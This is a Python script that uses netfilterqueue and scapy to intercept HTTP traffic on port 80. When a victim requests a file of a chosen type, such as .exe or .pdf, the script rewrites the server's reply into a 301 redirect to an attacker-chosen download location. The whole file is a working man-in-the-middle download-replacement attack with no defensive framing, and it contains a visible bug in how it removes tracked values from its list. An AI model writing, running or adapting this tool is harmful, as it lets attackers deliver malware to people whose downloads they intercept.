import netfilterqueue
import scapy.all as scapy
import optparse


def get_argument():
    parser = optparse.OptionParser()
    parser.add_option("-f", "--filetype", dest="file_type", help="Enter the file type (e.g., .exe or .pdf)")
    parser.add_option("-d", "--download", dest="download", help="Enter the download location")

    (options, arguments) = parser.parse_args()

    if not options.download:
        parser.error("[-] Enter the download location. Use --help for more information.")
    elif not options.file_type:
        parser.error("[-] Enter a valid file type to intercept. Use --help for more information.")

    return options


ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet.haslayer(scapy.TCP):
            if scapy_packet[scapy.TCP].dport == 80:  # Check for outgoing requests
                if options.file_type in str(scapy_packet[scapy.Raw].load):
                    print("[+] Detected " + options.file_type + " request.")
                    ack_list.append(scapy_packet[scapy.TCP].ack)

            elif scapy_packet[scapy.TCP].sport == 80:  # Check for incoming responses
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].ack)
                    print("[+] Replacing the file with redirect.")
                    load = "HTTP/1.1 301 Moved Permanently\nLocation: " + options.download
                    modified_packet = set_load(scapy_packet, load)
                    packet.set_payload(bytes(modified_packet))  # Set the modified packet payload

    packet.accept()  # Accept the packet


options = get_argument()
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
